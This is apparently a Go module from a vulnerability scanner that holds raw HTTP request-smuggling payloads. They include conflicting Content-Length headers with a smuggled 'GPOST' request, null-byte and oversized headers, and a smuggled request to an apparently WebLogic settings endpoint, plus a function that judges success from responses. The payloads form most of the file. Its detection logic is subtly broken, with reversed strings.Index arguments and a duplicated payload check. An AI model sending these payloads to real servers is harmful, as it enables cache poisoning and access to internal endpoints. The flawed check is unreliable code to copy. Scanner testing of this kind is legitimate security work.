package Smuggling

import (
	"log"
	"strings"
)

// \u0000
var ErrPayload = []string{`
POST %s HTTP/1.1
Host: %s%s
Connection: Keep-Alive
Content-Length: 6
Content-Length: 5

12345GPOST / HTTP/1.1
Host: localhost

`, `GET %s HTTP/1.1
Host: %s%s
Connection: Keep-Alive
X-Something: ` + "\x00" + ` something
X-Foo: Bar
GET /index.html?bar=1 HTTP/1.1
Host: localhost
`, `GET %s HTTP/1.1
Host: %s%s
Connection: Keep-Alive
X-Something: ` + "\x00" + ` something
GET http://localhost:7001/ws_utc/resources/setting/options/general?timestamp=1571211853278 HTTP/1.1`, `GET %s HTTP/1.1
Host: %s%s
X-Something: ` + strings.Repeat("A", 65535) + `
X-Foo: Bar
GET /index.html?bar=1 HTTP/1.1
Host: localhost
`, `GET %s HTTP/1.1
Host: %s%s
Connection: Keep-Alive
X-Something: ` + "\x00" + ` something
GET http://localhost:7001/ws_utc/resources/setting/options/general?timestamp=1571211853278 HTTP/1.1`}

func init() {
	for n, x := range ErrPayload {
		x = E2EC(x)
		ErrPayload[n] = x
	}
}

type Err struct {
	Base
}

func NewErr() *Err {
	x := &Err{}
	x.Type = "Err"
	x.Payload = ErrPayload
	return x
}

func (r *Err) CheckResponse(body string, payload string) bool {
	//log.Println(body)
	if payload == ErrPayload[1] {
		return -1 < strings.Index(body, "400 Bad Request") && -1 < strings.Index(body, "200 OK")
	} else if payload == ErrPayload[2] || payload == ErrPayload[3] { // 要不成功访问到目标，要不得到404
		return -1 < strings.Index(body, "<defaultValue>") || (-1 < strings.Index(body, "400 Bad Request") && -1 < strings.Index(body, "HTTP/1.1 404 Not Found"))
	} else if "" != body && (-1 < strings.Index("Unrecognized method GPOST", body)) {
		log.Println("Unrecognized method GPOST")
		return true
	}
	return false
}
